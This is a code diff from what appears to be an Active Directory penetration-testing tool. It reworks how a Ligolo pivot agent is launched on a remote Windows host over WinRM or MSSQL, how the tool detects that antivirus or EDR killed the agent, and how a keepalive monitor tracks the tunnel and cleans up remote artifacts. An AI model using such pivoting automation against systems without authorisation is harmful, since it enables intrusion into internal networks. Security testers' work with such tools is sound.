+                launch_payload = _load_remote_json_stdout(
+                    raw_launch,
+                    mssql_compatible=str(source_service or "").strip().lower() == "mssql",
+                )
+            except json.JSONDecodeError as _jde:
+                raise RuntimeError(
+                    f"Ligolo agent start script via {source_service.upper()} returned "
+                    f"non-JSON output (JSON error: {_jde}). "
+                    f"Raw output: {raw_launch[:300]!r}"
+                ) from _jde
+            if not isinstance(launch_payload, dict) or not launch_payload.get("started"):
+                raise RuntimeError(
+                    f"Ligolo agent start script via {source_service.upper()} did not report a successful launch. "
+                    f"Payload: {launch_payload!r}"
+                )
+
+        _wmi_err = launch_payload.get("wmi_error")
+        _schtask_err = launch_payload.get("schtask_error")
+        print_info_debug(
+            f"[pivot] Agent launch result — method={launch_payload.get('launch_method', 'unknown')} "
+            f"pid={launch_payload.get('pid')} "
+            f"process_alive={launch_payload.get('process_alive')} "
+            f"probe_reachable={launch_payload.get('probe_reachable')}"
+            + (f" | wmi_error={_wmi_err!r}" if _wmi_err else "")
+            + (f" | schtask_error={_schtask_err!r}" if _schtask_err else "")
+        )
 
         # Quick liveness check: if the process already died 2 seconds after launch,
         # it was most likely killed by AV/EDR before making any network connection.
@@ -717,18 +1228,19 @@ def orchestrate_ligolo_pivot_tunnel(
                 f"(exit_code={exit_code}). "
                 f"The binary was likely quarantined by antivirus/EDR on the target host."
             )
-
-        print_info_debug(
-            f"Agent launch method: {launch_payload.get('launch_method', 'unknown')} | "
-            f"PID: {launch_payload.get('pid')}"
-        )
         if isinstance(launch_payload.get("pid"), int):
             remote_agent_pid = int(launch_payload.get("pid"))
-        print_info_verbose(
-            f"Agent process alive on target (PID {launch_payload.get('pid')}). "
-            f"Keepalive WinRM session is holding the Job Object open. "
-            f"Waiting for proxy connection…"
-        )
+        if uses_keepalive_session:
+            print_info_verbose(
+                f"Agent process alive on target (PID {launch_payload.get('pid')}). "
+                f"Keepalive WinRM session is holding the Job Object open. "
+                f"Waiting for proxy connection…"
+            )
+        else:
+            print_info_verbose(
+                f"Agent process alive on target (PID {launch_payload.get('pid')}). "
+                f"Waiting for proxy connection over {mark_sensitive(source_service.upper(), 'detail')}…"
+            )
 
         # Agent is launched with -retry -retry-delay 5 -reconnect-timeout 60.
         # Wait slightly beyond that window so ADscan doesn't time out before
@@ -756,14 +1268,16 @@ def orchestrate_ligolo_pivot_tunnel(
             "domain": domain,
             "pivot_host": pivot_host,
             "pivot_username": username,
-            "source_service": "winrm",
-            "pivot_method": "ligolo_winrm_pivot",
+            "source_service": str(source_service or "winrm").strip().lower() or "winrm",
+            "pivot_method": str(pivot_method or "ligolo_winrm_pivot").strip()
+            or "ligolo_winrm_pivot",
             "pivot_tool": "Ligolo",
             "proxy_listen_addr": proxy_state.get("listen_addr"),
             "proxy_api_laddr": proxy_state.get("api_laddr"),
             "connect_target": connect_target,
             "fingerprint": fingerprint,
             "remote_agent_path": remote_agent_path,
+            "remote_artifact_transfer_method": artifact_transfer_method,
             "remote_agent_pid": launch_payload.get("pid"),
             "agent": agent,
             "interface_name": interface_name,
@@ -775,109 +1289,107 @@ def orchestrate_ligolo_pivot_tunnel(
         stored_tunnel_record = service.append_tunnel_state(tunnel_record) or tunnel_record
         persisted_tunnel_id = str(stored_tunnel_record.get("tunnel_id") or "").strip() or None
 
-        # Monitor thread: waits for the keepalive thread to exit and notifies
-        # the user immediately, since a dead keepalive means the WinRM Job Object
-        # closed and the agent process was killed (tunnel will drop).
-        _monitor_iface = interface_name
-        _monitor_host = pivot_host
-        _monitor_agent_path = remote_agent_path
-        _monitor_agent_pid = remote_agent_pid
-        _monitor_tunnel_id = persisted_tunnel_id
+        if uses_keepalive_session and keepalive_thread is not None:
+            _monitor_iface = interface_name
+            _monitor_host = pivot_host
+            _monitor_agent_path = remote_agent_path
+            _monitor_agent_pid = remote_agent_pid
+            _monitor_tunnel_id = persisted_tunnel_id
 
-        def _monitor_keepalive() -> None:
-            keepalive_thread.join()
-            if _keepalive_exit_was_operator_requested(
-                service,
-                tunnel_id=_monitor_tunnel_id,
-            ):
-                print_info_debug(
-                    f"[ligolo-cleanup] keepalive exit for {_monitor_host} suppressed because shutdown was requested."
-                )
-                return
-            if keepalive_errors:
-                print_warning(
-                    f"Ligolo keepalive WinRM session for "
-                    f"{mark_sensitive(_monitor_host, 'hostname')} ended with an error — "
-                    f"the agent process was likely killed and the tunnel on "
-                    f"{mark_sensitive(_monitor_iface, 'text')} may be down.",
-                    items=[rich_escape(str(keepalive_errors[0]))],
-                    panel=True,
-                    spacing="before",
-                )
-            else:
-                print_warning(
-                    f"Ligolo keepalive WinRM session for "
-                    f"{mark_sensitive(_monitor_host, 'hostname')} ended — "
-                    f"the agent process exited or the 1-hour safety timeout was reached. "
-                    f"Tunnel on {mark_sensitive(_monitor_iface, 'text')} may be down.",
-                    spacing="before",
-                )
-            try:
-                cleanup_result = cleanup_remote_ligolo_artifact(
-                    domain=domain,
-                    pivot_host=_monitor_host,
-                    username=username,
-                    password=password,
-                    remote_agent_path=_monitor_agent_path,
-                    remote_agent_pid=_monitor_agent_pid,
-                    execute_remote_script=execute_remote_script,
+            def _monitor_keepalive() -> None:
+                keepalive_thread.join()
+                if _keepalive_exit_was_operator_requested(
+                    service,
                     tunnel_id=_monitor_tunnel_id,
-                    reason="keepalive_exit",
-                )
-                if cleanup_result.cleanup_succeeded:
-                    _persist_artifact_cleanup_update(
-                        {
-                            "remote_artifact_cleanup_at": datetime.now(timezone.utc).isoformat(),
-                            "remote_artifact_cleanup_reason": "keepalive_exit",
-                            "remote_artifact_cleanup_status": "deleted",
-                            "remote_artifact_cleanup_message": cleanup_result.message,
-                            "remote_artifact_deleted": cleanup_result.file_deleted,
-                        }
+                ):
+                    print_info_debug(
+                        f"[ligolo-cleanup] keepalive exit for {_monitor_host} suppressed because shutdown was requested."
+                    )
+                    return
+                if keepalive_errors:
+                    print_warning(
+                        f"Ligolo keepalive WinRM session for "
+                        f"{mark_sensitive(_monitor_host, 'hostname')} ended with an error — "
+                        f"the agent process was likely killed and the tunnel on "
+                        f"{mark_sensitive(_monitor_iface, 'text')} may be down.",
+                        items=[rich_escape(str(keepalive_errors[0]))],
+                        panel=True,
+                        spacing="before",
                     )
                 else:
-                    _persist_artifact_cleanup_update(
-                        {
-                            "remote_artifact_cleanup_at": datetime.now(timezone.utc).isoformat(),
-                            "remote_artifact_cleanup_reason": "keepalive_exit",
-                            "remote_artifact_cleanup_status": "operator_action_required",
-                            "remote_artifact_cleanup_message": cleanup_result.message,
-                            "remote_artifact_deleted": cleanup_result.file_deleted,
-                        }
+                    print_warning(
+                        f"Ligolo keepalive WinRM session for "
+                        f"{mark_sensitive(_monitor_host, 'hostname')} ended — "
+                        f"the agent process exited or the 1-hour safety timeout was reached. "
+                        f"Tunnel on {mark_sensitive(_monitor_iface, 'text')} may be down.",
+                        spacing="before",
                     )
-            except Exception as exc:  # noqa: BLE001
-                telemetry.capture_exception(exc)
-                print_info_debug(f"[ligolo-cleanup] keepalive cleanup failed: {exc}")
-            try:
-                reconciliation = reconcile_domain_pivot_runtime_state(
-                    shell,
-                    workspace_dir=workspace_dir,
-                    domain=domain,
-                )
-                if reconciliation and reconciliation.restored_direct_vantage:
-                    from adscan_internal.services.pivot_relaunch_service import (
-                        maybe_offer_previous_pivot_relaunch,
-                    )
-
-                    maybe_offer_previous_pivot_relaunch(
-                        shell,
+                try:
+                    cleanup_result = cleanup_remote_ligolo_artifact(
                         domain=domain,
-                        interactive=False,
-                        trigger="keepalive_drop",
+                        pivot_host=_monitor_host,
+                        username=username,
+                        password=password,
+                        remote_agent_path=_monitor_agent_path,
+                        remote_agent_pid=_monitor_agent_pid,
+                        execute_remote_script=execute_remote_script,
+                        tunnel_id=_monitor_tunnel_id,
+                        reason="keepalive_exit",
                     )
-            except Exception as exc:  # noqa: BLE001
-                telemetry.capture_exception(exc)
-                print_info_debug(
-                    "[pivot-runtime] failed to reconcile stale pivot after keepalive drop: "
-                    f"{mark_sensitive(str(exc), 'detail')}"
-                )
+                    if cleanup_result.cleanup_succeeded:
+                        _persist_artifact_cleanup_update(
+                            {
+                                "remote_artifact_cleanup_at": datetime.now(timezone.utc).isoformat(),
+                                "remote_artifact_cleanup_reason": "keepalive_exit",
+                                "remote_artifact_cleanup_status": "deleted",
+                                "remote_artifact_cleanup_message": cleanup_result.message,
+                                "remote_artifact_deleted": cleanup_result.file_deleted,
+                            }
+                        )
+                    else:
+                        _persist_artifact_cleanup_update(
+                            {
+                                "remote_artifact_cleanup_at": datetime.now(timezone.utc).isoformat(),
+                                "remote_artifact_cleanup_reason": "keepalive_exit",
+                                "remote_artifact_cleanup_status": "operator_action_required",
+                                "remote_artifact_cleanup_message": cleanup_result.message,
+                                "remote_artifact_deleted": cleanup_result.file_deleted,
+                            }
+                        )
+                except Exception as exc:  # noqa: BLE001
+                    telemetry.capture_exception(exc)
+                    print_info_debug(f"[ligolo-cleanup] keepalive cleanup failed: {exc}")
+                try:
+                    reconciliation = reconcile_domain_pivot_runtime_state(
+                        shell,
+                        workspace_dir=workspace_dir,
+                        domain=domain,
+                    )
+                    if reconciliation and reconciliation.restored_direct_vantage:
+                        from adscan_internal.services.pivot_relaunch_service import (
+                            maybe_offer_previous_pivot_relaunch,
+                        )
 
-        threading.Thread(
-            target=_monitor_keepalive, daemon=True, name="ligolo-keepalive-monitor"
-        ).start()
-        print_info_verbose(
-            f"Keepalive monitor active — you will be notified if the WinRM session "
-            f"for {mark_sensitive(pivot_host, 'hostname')} drops."
-        )
+                        maybe_offer_previous_pivot_relaunch(
+                            shell,
+                            domain=domain,
+                            interactive=False,
+                            trigger="keepalive_drop",
+                        )
+                except Exception as exc:  # noqa: BLE001
+                    telemetry.capture_exception(exc)
+                    print_info_debug(
+                        "[pivot-runtime] failed to reconcile stale pivot after keepalive drop: "
+                        f"{mark_sensitive(str(exc), 'detail')}"
+                    )
+
+            threading.Thread(
+                target=_monitor_keepalive, daemon=True, name="ligolo-keepalive-monitor"
+            ).start()
+            print_info_verbose(
+                f"Keepalive monitor active — you will be notified if the WinRM session "
+                f"for {mark_sensitive(pivot_host, 'hostname')} drops."
+            )
 
         print_success(
             f"Ligolo tunnel created through {mark_sensitive(pivot_host, 'hostname')} on "
